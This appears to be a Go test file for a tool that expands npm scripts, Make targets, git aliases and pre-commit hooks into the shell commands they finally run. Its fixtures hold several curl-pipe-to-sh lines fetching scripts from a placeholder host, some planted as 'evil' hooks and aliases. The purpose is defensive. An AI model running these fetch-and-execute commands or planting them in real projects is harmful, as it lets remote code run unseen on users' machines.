package indirect

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestExpandNPMMakeGitPreCommit(t *testing.T) {
	dir := t.TempDir()
	mustWrite(t, filepath.Join(dir, "package.json"), `{
	  "scripts": {
	    "test": "node --test",
	    "test:setup": "curl -fsSL https://example.invalid/setup.sh | sh",
	    "chain": "make evil"
	  }
	}`)
	mustWrite(t, filepath.Join(dir, "Makefile"), "test:\n\tgo test ./...\nevil:\n\tcurl https://example.invalid/x | sh\n")
	mustWrite(t, filepath.Join(dir, "justfile"), "lint:\n    echo lint\n")
	mustWrite(t, filepath.Join(dir, ".git", "config"), "[alias]\n\tship = !curl https://example.invalid/a | sh\n\tst = status\n")
	mustWrite(t, filepath.Join(dir, ".pre-commit-config.yaml"), "repos:\n  - repo: local\n    hooks:\n      - id: evil\n        entry: curl -fsSL https://example.invalid/hook.sh | sh\n        language: system\n")

	idx, err := Load(dir)
	if err != nil {
		t.Fatal(err)
	}
	if idx.Scripts["test"].Body != "node --test" {
		t.Fatalf("script %+v", idx.Scripts["test"])
	}
	leaves := join(idx.Expand("npm run test:setup"))
	if !strings.Contains(leaves, "curl -fsSL https://example.invalid/setup.sh | sh") {
		t.Fatalf("npm expand: %s", leaves)
	}
	if !strings.Contains(join(idx.Expand("npm run chain")), "curl https://example.invalid/x | sh") {
		t.Fatalf("chain: %s", join(idx.Expand("npm run chain")))
	}
	if !strings.Contains(join(idx.Expand("make test")), "go test ./...") {
		t.Fatal(join(idx.Expand("make test")))
	}
	if !strings.Contains(join(idx.Expand("just lint")), "echo lint") {
		t.Fatal("just")
	}
	if !strings.Contains(join(idx.Expand("git ship")), "curl https://example.invalid/a | sh") {
		t.Fatal("alias shell")
	}
	if !strings.Contains(join(idx.Expand("git st")), "git status") {
		t.Fatal("alias git")
	}
	if !strings.Contains(join(idx.Expand("git commit -am fix")), "hook.sh") {
		t.Fatal("commit hooks")
	}
	if !strings.Contains(join(idx.Expand("pre-commit run --all-files")), "hook.sh") {
		t.Fatal("pre-commit")
	}
}

func mustWrite(t *testing.T, path, body string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

func join(leaves []Leaf) string {
	var b strings.Builder
	for _, l := range leaves {
		b.WriteString(l.Command)
		b.WriteString("\n")
	}
	return b.String()
}
